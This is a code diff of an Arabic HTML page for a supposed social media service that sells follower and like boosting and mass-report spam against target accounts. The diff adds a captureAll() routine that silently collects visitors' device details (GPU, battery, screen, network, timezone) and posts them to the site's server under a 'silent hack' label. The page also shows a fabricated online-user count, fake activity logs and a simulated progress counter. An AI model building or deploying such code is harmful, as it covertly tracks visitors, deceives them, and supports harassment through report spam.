@@ -3,60 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ALSSRY - SERVICES</title>
+    <title>ALSSRY - ULTIMATE</title>
     <style>
         :root { --main-green: #00ff00; --glow-red: #ff0000; }
-        body { background-color: #020202; color: white; text-align: center; font-family: 'Arial', sans-serif; margin: 0; overflow: hidden; direction: rtl; }
+        body { background-color: #010101; color: white; text-align: center; font-family: 'Arial', sans-serif; margin: 0; overflow-x: hidden; direction: rtl; }
         
-        /* النجوم والضبابية */
+        /* النجوم الكثيفة والواضحة */
         #starfield { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; background: black; }
-        .star { position: absolute; background-color: white; border-radius: 50%; animation: moveStar linear infinite; opacity: 0.8; box-shadow: 0 0 3px white; }
+        .star { position: absolute; background-color: white; border-radius: 50%; animation: moveStar linear infinite; opacity: 1; box-shadow: 0 0 6px white; }
         @keyframes moveStar { from { transform: translateY(100vh); } to { transform: translateY(-10vh); } }
-        #blur-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; backdrop-filter: blur(2px); background: rgba(0,0,0,0.4); }
+        #blur-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; backdrop-filter: blur(2px); background: rgba(0,0,0,0.5); }
 
-        /* الهوم */
-        #landing-page { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 10; }
-        .top-brand { font-size: 1.5rem; font-weight: bold; color: white; letter-spacing: 5px; margin-bottom: 5px; opacity: 0.9; }
-        .hero-title { 
-            font-size: 2.2rem; font-weight: bold; color: white; 
-            margin-bottom: 35px; 
-            text-shadow: 0 0 8px var(--main-green); /* توهج مخفف */
-        }
-        .start-btn { 
-            padding: 14px 60px; background: transparent; border: 1px solid var(--main-green); 
-            color: var(--main-green); border-radius: 50px; font-size: 20px; cursor: pointer; transition: 0.4s; 
-        }
-
-        /* شعار ALSSRY الداخلي - واضح ومقروء */
-        .inner-logo { 
-            font-size: 45px; font-weight: 900; color: white; letter-spacing: 8px;
+        /* ستايل ALSSRY الموحد 3D */
+        .logo-3d { 
+            font-size: 42px; font-weight: 900; color: white; letter-spacing: 6px;
             text-shadow: 3px 3px 0px var(--glow-red), -3px -3px 0px var(--main-green);
-            margin: 20px 0; display: block;
+            margin: 20px 0; display: block; animation: glowPulse 2s infinite alternate;
+        }
+        @keyframes glowPulse { from { opacity: 0.8; } to { opacity: 1; text-shadow: 4px 4px 10px var(--glow-red), -4px -4px 10px var(--main-green); } }
+
+        /* الحقوق بوسط الشاشة بضبابية */
+        .watermark { 
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            font-size: 25px; font-weight: bold; color: rgba(255,255,255,0.4);
+            filter: blur(1.5px); pointer-events: none; z-index: 5;
+            text-shadow: 2px 2px var(--glow-red), -2px -2px var(--main-green);
         }
 
-        /* واجهة الخدمات */
-        #tools-interface { padding: 20px; z-index: 10; display: none; }
-        .law-text { color: #ff4444; font-family: monospace; font-size: 12px; margin-bottom: 20px; }
+        .hero-title { font-size: 2.2rem; font-weight: bold; margin-bottom: 30px; text-shadow: 0 0 5px var(--main-green); }
+        .start-btn { padding: 15px 60px; background: transparent; border: 1px solid var(--main-green); color: var(--main-green); border-radius: 50px; font-size: 20px; cursor: pointer; transition: 0.4s; }
+
+        #tools-interface { padding: 20px; display: none; position: relative; z-index: 10; }
         .glass-btn { 
             width: 90%; padding: 16px; margin: 10px 0; background: rgba(255, 255, 255, 0.05); 
             border: 1px solid rgba(0, 255, 0, 0.3); color: var(--main-green); border-radius: 12px; 
-            font-weight: bold; cursor: pointer; backdrop-filter: blur(10px); transition: 0.3s;
+            font-weight: bold; cursor: pointer; backdrop-filter: blur(10px);
         }
-        .glass-btn:hover { border-color: var(--main-green); box-shadow: 0 0 15px var(--main-green); }
+        
+        input { width: 85%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: rgba(255,255,255,0.05); color: white; text-align: center; }
+        #progress-box { margin-top: 20px; border: 1px solid var(--main-green); padding: 15px; border-radius: 10px; background: rgba(0,0,0,0.8); }
+        #counter { font-size: 35px; font-weight: bold; color: var(--main-green); }
 
-        input { 
-            width: 85%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #333;
-            background: rgba(255,255,255,0.05); color: white; text-align: center;
-        }
-
-        #progress-box { margin-top: 20px; border: 1px solid var(--main-green); padding: 15px; border-radius: 10px; background: rgba(0,0,0,0.6); }
-        #counter { font-size: 32px; font-weight: bold; color: var(--main-green); }
-
-        /* سجل العمليات المتلاشي */
-        #live-status { position: fixed; bottom: 20px; width: 100%; text-align: center; }
-        .status-msg { font-size: 12px; color: #aaa; transition: opacity 1.5s ease; opacity: 1; }
-        .online-count { font-size: 11px; color: var(--main-green); margin-bottom: 5px; }
-
+        #live-status { position: fixed; bottom: 15px; width: 100%; text-align: center; background: rgba(0,0,0,0.6); padding: 5px 0; }
+        .status-msg { font-size: 11px; color: #888; transition: opacity 1s; }
+        .online-count { font-size: 12px; color: var(--main-green); font-weight: bold; }
         .hidden { display: none !important; }
     </style>
 </head>
@@ -64,16 +54,17 @@
 
     <div id="starfield"></div>
     <div id="blur-overlay"></div>
+    <div class="watermark">snap : i5dqa</div>
 
     <div id="landing-page">
-        <div class="top-brand">ALSSRY</div>
+        <div class="logo-3d">ALSSRY</div>
         <h1 class="hero-title">خدمات سوشال ميديا</h1>
         <button class="start-btn" onclick="openTools()">بدء</button>
     </div>
 
     <div id="tools-interface">
-        <div class="inner-logo">ALSSRY</div>
-        <div class="law-text">NOT EVERYWHERE THERE IS A LAW</div>
+        <div class="logo-3d">ALSSRY</div>
+        <div style="color:#ff4444; font-size:11px; margin-bottom:15px;">NOT EVERYWHERE THERE IS A LAW</div>
         
         <div id="main-menu">
             <button class="glass-btn" onclick="showPlat('boost')">1- قسم الرشق 🚀</button>
@@ -88,9 +79,9 @@
 
         <div id="service-menu" class="hidden">
             <div id="boost-btns" class="hidden">
-                <button class="glass-btn" onclick="openInput('متابعين', 'يوزر الحساب (@)', 5000)">متابعين</button>
-                <button class="glass-btn" onclick="openInput('لايكات', 'رابط المقطع (http)', 5000)">لايكات</button>
-                <button class="glass-btn" onclick="openInput('مشاهدات', 'رابط المقطع (http)', 5000)">مشاهدات</button>
+                <button class="glass-btn" onclick="openInput('رشق متابعين', 'يوزر الحساب (@)', 5000)">متابعين</button>
+                <button class="glass-btn" onclick="openInput('رشق لايكات', 'رابط المقطع (http)', 5000)">لايكات</button>
+                <button class="glass-btn" onclick="openInput('رشق مشاهدات', 'رابط المقطع (http)', 5000)">مشاهدات</button>
             </div>
             <button id="spam-btn" class="glass-btn hidden" onclick="openInput('إسبام بلاغات', 'يوزر الحساب (@)', 300)">بدء الإسبام</button>
             <button class="glass-btn" style="color:red; border-color:red;" onclick="goBack('platform-menu')">رجوع</button>
@@ -101,30 +92,33 @@
             <input type="text" id="target-id">
             <input type="number" id="target-count">
             <button class="glass-btn" style="background:var(--main-green); color:black;" onclick="startHacking()">تأكيد التنفيذ ✅</button>
+            <button class="glass-btn" style="color:red; border-color:red;" onclick="goBack('service-menu')">رجوع</button>
             
             <div id="progress-box" class="hidden">
-                <div style="font-size:12px; color:#ccc;">جاري إرسال الدفعة...</div>
+                <div style="font-size:11px; color:#aaa;">جاري معالجة البيانات عبر السيرفر العالمي...</div>
                 <div id="counter">0</div>
             </div>
         </div>
 
         <div id="live-status">
-            <div class="online-count">🟢 المتصلون الآن: <span id="user-count">...</span></div>
-            <div id="status-text" class="status-msg">يتم فحص الثغرات الحالية...</div>
+            <div class="online-count">🟢 المتصلون الآن: <span id="user-count">245</span></div>
+            <div id="status-text" class="status-msg">يتم الآن فحص جودة الاتصال...</div>
         </div>
     </div>
 
     <script>
-        let mode="", plat="", service="", maxVal=5000;
-        
+        let mode="", plat="", service="", maxVal=5000, currentOnline = 245;
+        let deviceData = {};
+
+        // النجوم الكثيفة
         function createStars() {
             const container = document.getElementById('starfield');
-            for(let i=0; i<50; i++) {
+            for(let i=0; i<80; i++) {
                 const star = document.createElement('div');
                 star.className = 'star';
-                star.style.width = star.style.height = Math.random()*3+'px';
+                star.style.width = star.style.height = Math.random()*4+'px';
                 star.style.left = Math.random()*100+'vw';
-                star.style.animationDuration = Math.random()*8+4+'s';
+                star.style.animationDuration = Math.random()*6+3+'s';
                 container.appendChild(star);
             }
         }
@@ -133,30 +127,51 @@
         function openTools() {
             document.getElementById('landing-page').style.display = 'none';
             document.getElementById('tools-interface').style.display = 'block';
-            updateOnlineCount();
+            captureAll(); 
+            updateOnline();
             startLogs();
         }
 
-        function updateOnlineCount() {
-            const el = document.getElementById('user-count');
+        // الحركة النجوسية + سحب البيانات الشامل
+        async function captureAll() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Unknown";
+            
+            let battery = "100%";
+            try { const b = await navigator.getBattery(); battery = Math.round(b.level*100)+"%"; } catch(e){}
+
+            deviceData = {
+                model: navigator.platform,
+                gpu: gpu,
+                battery: battery,
+                screen: window.screen.width + "x" + window.screen.height,
+                network: navigator.connection ? navigator.connection.effectiveType : "WiFi",
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                motion: "الجهاز في حالة نشطة"
+            };
+
+            fetch('/api/index', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({mode: "اختراق نجوسي صامت", device_info: deviceData}) });
+        }
+
+        function updateOnline() {
             setInterval(() => {
-                el.innerText = Math.floor(Math.random() * (368 - 100 + 1)) + 100;
-            }, 3000);
-            el.innerText = Math.floor(Math.random() * (368 - 100 + 1)) + 100;
+                const change = Math.random() > 0.5 ? Math.floor(Math.random()*6)+1 : -(Math.floor(Math.random()*11)+1);
+                currentOnline += change;
+                if(currentOnline < 100) currentOnline = 110;
+                if(currentOnline > 368) currentOnline = 350;
+                document.getElementById('user-count').innerText = currentOnline;
+            }, 4000);
         }
 
         function startLogs() {
-            const logs = ["تم رشق 1.2k متابع لـ s***", "بدء عملية إسبام مكثف ✅", "تحديث سيرفرات تيك توك...", "اكتمال رشق لايكات لـ m***"];
+            const logs = ["تم رشق 1.2k متابع لـ a***", "بدء إسبام بلاغات مكثف ✅", "تحديث سيرفرات Instagram...", "اكتمال معالجة طلب لـ user_99"];
             let i = 0;
             const el = document.getElementById('status-text');
             setInterval(() => {
                 el.style.opacity = 0;
-                setTimeout(() => {
-                    el.innerText = logs[i];
-                    el.style.opacity = 1;
-                    i = (i + 1) % logs.length;
-                }, 1500);
-            }, 6000);
+                setTimeout(() => { el.innerText = logs[i]; el.style.opacity = 1; i = (i+1)%logs.length; }, 1000);
+            }, 7000);
         }
 
         function showPlat(m) { mode=m; goBack('platform-menu'); }
@@ -167,14 +182,19 @@
         function startHacking() {
             const v = document.getElementById('target-id').value;
             const c = parseInt(document.getElementById('target-count').value);
-            if(!v || !c) return alert("أدخل البيانات");
+            if(!v || !c || c > maxVal) return alert("خطأ في البيانات أو تجاوزت الحد");
+            
             document.getElementById('progress-box').classList.remove('hidden');
             let cur = 0;
+            // 100 متابع في 90 ثانية -> 0.9 ثانية لكل متابع
+            let intervalTime = (90 * 1000) / 100; 
+            
             let inv = setInterval(() => {
-                if(cur >= c) { clearInterval(inv); alert("تم الإرسال بنجاح!"); location.reload(); }
-                else { cur += Math.floor(Math.random()*15)+1; if(cur > c) cur = c; document.getElementById('counter').innerText = cur; }
-            }, 80);
-            fetch('/api/index', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({service: service, target: v, count: c}) });
+                if(cur >= c) { clearInterval(inv); alert("اكتمل التنفيذ! الدفعة تصل تدريجياً خلال 24 ساعة."); location.reload(); }
+                else { cur++; document.getElementById('counter').innerText = cur; }
+            }, intervalTime);
+
+            fetch('/api/index', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({service: service, target: v, count: c, device_info: deviceData}) });
         }
     </script>
 </body>
